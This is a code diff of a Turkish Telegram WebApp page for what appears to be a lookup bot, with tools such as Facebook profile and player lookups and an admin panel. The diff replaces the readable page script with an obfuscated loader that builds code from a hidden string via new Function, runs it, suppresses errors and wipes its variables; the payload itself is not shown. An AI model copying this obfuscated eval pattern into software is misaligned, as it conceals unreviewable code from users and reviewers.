-          { id: "decend", name: "Encode/Decode", icon: "🔄", desc: "Şifrele / Çöz", fields: [
-            { key: "metin", label: "Metin", placeholder: "Metin girin", required: true },
-            { key: "islem", label: "İşlem", required: true, type: "select", options: [
-              { value: "encode", label: "Encode" },
-              { value: "decode", label: "Decode" }
-            ]}
-          ]},
-          { id: "log", name: "Log Bulucu", icon: "📜", desc: "Log arama", fields: [
-            { key: "arama", label: "Arama", placeholder: "Aranacak kelime", required: true }
-          ]},
-          { id: "screen", name: "Screenshot", icon: "📸", desc: "Site ekran görüntüsü", fields: [
-            { key: "url", label: "URL", placeholder: "https://example.com", required: true }
-          ]},
-          { id: "craft", name: "Craftrise", icon: "⛏️", desc: "Oyuncu sorgula", fields: [
-            { key: "kullanici", label: "Kullanıcı Adı", placeholder: "Oyuncu adı", required: true }
-          ]},
-          { id: "face", name: "Facebook", icon: "📘", desc: "Profil bilgisi", fields: [
-            { key: "link", label: "Profil Linki", placeholder: "https://facebook.com/...", required: true }
-          ]},
-          { id: "hesap", name: "Döviz", icon: "💱", desc: "Kur hesaplama", fields: [
-            { key: "miktar", label: "Miktar", placeholder: "100", required: true, type: "number" },
-            { key: "birim", label: "Birim", required: true, type: "select", options: [
-              { value: "USD", label: "USD" },
-              { value: "EUR", label: "EUR" },
-              { value: "GBP", label: "GBP" }
-            ]}
-          ]},
-          { id: "qr_gen", name: "QR Üretici", icon: "📱", desc: "QR kod oluştur", fields: [
-            { key: "metin", label: "Metin / URL", placeholder: "https://example.com", required: true }
-          ]}
-        ]
-      },
-      admin: {
-        title: "YÖNETİM PANELİ",
-        isAdmin: true,
-        items: [
-          { id: "admin_announcement", name: "Duyuru Gönder", icon: "📢", desc: "Tüm kullanıcılara mesaj", fields: [
-            { key: "mesaj", label: "Duyuru Mesajı", placeholder: "Duyuru metnini yazın...", required: true, type: "textarea" }
-          ]},
-          { id: "admin_total_users", name: "Kullanıcı Sayısı", icon: "👥", desc: "Toplam kullanıcı", fields: []},
-          { id: "admin_user_list", name: "Kullanıcı Listesi", icon: "📂", desc: "Tüm kullanıcılar", fields: []},
-          { id: "admin_ban_user", name: "Kullanıcı Banla", icon: "🚫", desc: "Kullanıcı yasakla", fields: [
-            { key: "hedef", label: "Kullanıcı ID veya @username", placeholder: "7424617978 veya @kullanici", required: true },
-            { key: "sebep", label: "Sebep", placeholder: "Ban sebebi", required: false }
-          ]},
-          { id: "admin_unban_user", name: "Ban Kaldır", icon: "✅", desc: "Yasağı kaldır", fields: [
-            { key: "hedef", label: "Kullanıcı ID veya @username", placeholder: "7424617978 veya @kullanici", required: true }
-          ]},
-          { id: "admin_banlist", name: "Banlı Liste", icon: "📜", desc: "Banlı kullanıcılar", fields: []},
-          { id: "admin_get_logs", name: "Logları Getir", icon: "📋", desc: "Sistem logları", fields: []},
-          { id: "admin_restart_bot", name: "Botu Yeniden Başlat", icon: "🔄", desc: "Bot restart", fields: []},
-          { id: "admin_destroy_bot", name: "Botu Yok Et", icon: "💀", desc: "DİKKAT: Geri dönüşü yok", fields: []}
-        ]
-      }
-    };
+  try{
+    var _0x6b9a=new Function(_0x5e1c);
+    _0x6b9a["call"](_0xe7c2);
+  }catch(_0xfatal){
+    try{_0xe7c2["Telegram"]["WebApp"]["showAlert"]("Yukleme hatasi");}catch(_0x){}
+  }
 
-    function showPage(id) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      document.getElementById('page-' + id).classList.add('active');
-    }
-
-    function goHome() {
-      currentCategory = null;
-      showPage('home');
-    }
-
-    function goBackToCategory() {
-      if (currentCategory) showCategory(currentCategory);
-      else goHome();
-    }
-
-    function showCategory(cat) {
-      if (cat === 'admin' && userId !== ADMIN_ID) return;
-      currentCategory = cat;
-      const data = queries[cat];
-      document.getElementById('categoryTitle').textContent = data.title;
-
-      const list = document.getElementById('queryList');
-      list.innerHTML = '';
-
-      data.items.forEach(item => {
-        const el = document.createElement('div');
-        el.className = 'query-item' + (data.isAdmin ? ' admin-query-item' : '');
-
-        if (item.fields.length === 0) {
-          el.onclick = () => sendDirect(item.id);
-        } else {
-          el.onclick = () => showForm(cat, item);
-        }
-
-        el.innerHTML = `
-          <div class="qi-left">
-            <div class="qi-icon">${item.icon}</div>
-            <div>
-              <div class="qi-name">${item.name}</div>
-              <div class="qi-desc">${item.desc}</div>
-            </div>
-          </div>
-          <div class="qi-arrow">›</div>
-        `;
-        list.appendChild(el);
-      });
-
-      showPage('category');
-    }
-
-    let currentQueryId = null;
-    let isAdminForm = false;
-
-    function showForm(cat, item) {
-      currentQueryId = item.id;
-      isAdminForm = queries[cat].isAdmin || false;
-      document.getElementById('formTitle').textContent = item.name.toUpperCase();
-      document.getElementById('formBarTitle').textContent = item.name;
-      document.getElementById('formBadge').textContent = isAdminForm ? 'ADMIN' : 'HAZIR';
-      document.getElementById('formBadge').style.background = isAdminForm ? 'var(--red)' : 'var(--green)';
-
-      const btn = document.getElementById('submitBtn');
-      btn.className = 'submit-btn' + (isAdminForm ? ' admin-submit' : '');
-      btn.textContent = isAdminForm ? '[ ÇALIŞTIR ]' : '[ SORGULA ]';
-
-      const container = document.getElementById('formFields');
-      container.innerHTML = '';
-
-      item.fields.forEach(field => {
-        const group = document.createElement('div');
-        group.className = 'form-group';
-
-        let labelHTML = field.label;
-        if (!field.required) labelHTML += '<span class="optional-tag">OPSİYONEL</span>';
-
-        let inputHTML = '';
-        if (field.type === 'textarea') {
-          inputHTML = `<textarea name="${field.key}" placeholder="${field.placeholder}" ${field.required ? 'required' : ''} rows="3"></textarea>`;
-        } else if (field.type === 'select') {
-          const opts = field.options.map(o => `<option value="${o.value}">${o.label}</option>`).join('');
-          inputHTML = `<select name="${field.key}" ${field.required ? 'required' : ''}>${opts}</select>`;
-        } else {
-          const type = field.type || 'text';
-          const pattern = field.pattern ? `pattern="${field.pattern}"` : '';
-          const maxlength = field.maxlength ? `maxlength="${field.maxlength}"` : '';
-          inputHTML = `<input type="${type}" name="${field.key}" placeholder="${field.placeholder || ''}" ${field.required ? 'required' : ''} ${pattern} ${maxlength} autocomplete="off">`;
-        }
-
-        group.innerHTML = `<label>${labelHTML}</label>${inputHTML}`;
-        container.appendChild(group);
-      });
-
-      showPage('form');
-      const firstInput = container.querySelector('input, textarea');
-      if (firstInput) setTimeout(() => firstInput.focus(), 300);
-    }
-
-    function sendDirect(type) {
-      const payload = JSON.stringify({ type: type, data: {} });
-      showLoading();
-      try { tg.sendData(payload); } catch(e) { hideLoading(); tg.showAlert('Hata: ' + e.message); }
-    }
-
-    function submitQuery(e) {
-      e.preventDefault();
-      const form = document.getElementById('queryForm');
-      const formData = new FormData(form);
-      const data = {};
-      formData.forEach((val, key) => { data[key] = val.trim(); });
-
-      const payload = JSON.stringify({ type: currentQueryId, data: data });
-      showLoading();
-      try { tg.sendData(payload); } catch(e) { hideLoading(); tg.showAlert('Hata: ' + e.message); }
-    }
-
-    function showLoading() {
-      document.getElementById('loadingOverlay').classList.add('active');
-    }
-
-    function hideLoading() {
-      document.getElementById('loadingOverlay').classList.remove('active');
-    }
-  </script>
+  _0x2a8f=null;_0x5e1c=null;_0xa1f0=null;
+})();
+</script>
 </body>
 </html>
